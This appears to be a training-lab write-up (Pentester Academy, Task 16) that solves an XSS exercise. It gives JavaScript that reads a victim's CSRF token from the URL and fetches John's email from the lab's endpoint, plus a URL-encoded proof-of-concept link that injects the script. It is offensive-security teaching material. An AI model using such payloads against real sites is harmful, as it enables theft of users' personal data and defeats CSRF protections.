## Task 16 <small>[[Try Now]](http://pentesteracademylab.appspot.com/lab/webapp/jfp/16?csrf_token=87756351612121977981321312312123123126554427773)</small>

Objectives:

1. Find John's Email Address using an XSS vulnerability on this page
2. Display the Email address in the div with id "result"
3. No Hardcoded values can be used - everything has to be figured out dynamically

Since the CSRF Token value of user can change, we need use some JS oriented way to get the query parameter and send the XHR to the below url

![](https://i.ibb.co/QF3vQDW/Screenshot-20201226-012703.png)

You can use [Location.search](https://developer.mozilla.org/en-US/docs/Web/API/Location/search) to get the query paramter dynamically and [URLSearchParams](https://developer.mozilla.org/en-US/docs/Web/API/URLSearchParams/URLSearchParams) to parse them

```js
const qp = new URLSearchParams(location.search);
qp.set("name", "john");

const xhttp = new XMLHttpRequest();

xhttp.onreadystatechange = function () {
  if (this.readyState == 4 && this.status == 200) {
    document.querySelector("#result").innerText = xhttp.responseText;
  }
};
xhttp.open("GET", "http://pentesteracademylab.appspot.com/lab/webapp/jfp/16/email?" + qp.toString(), true);
xhttp.send();
```

For POC, [Click Here](http://pentesteracademylab.appspot.com/lab/webapp/jfp/16?csrf_token=87756351612121977981321312312123123126554427773&url=%3Cscript%3E%0Aconst%20qp%20%3D%20new%20URLSearchParams%28location.search%29%3B%0Aqp.set%28%22name%22%2C%20%22john%22%29%3B%0A%0Aconst%20xhttp%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%0Axhttp.onreadystatechange%20%3D%20function%20%28%29%20%7B%0A%20%20if%20%28this.readyState%20%3D%3D%204%20%26%26%20this.status%20%3D%3D%20200%29%20%7B%0A%20%20%20%20document.querySelector%28%22%23result%22%29.innerText%20%3D%20xhttp.responseText%3B%0A%20%20%7D%0A%7D%3B%0Axhttp.open%28%22GET%22%2C%20%22http%3A%2F%2Fpentesteracademylab.appspot.com%2Flab%2Fwebapp%2Fjfp%2F16%2Femail%3F%22%20%2B%20qp.toString%28%29%2C%20true%29%3B%0Axhttp.send%28%29%3B%0A%3C%2Fscript%3E)
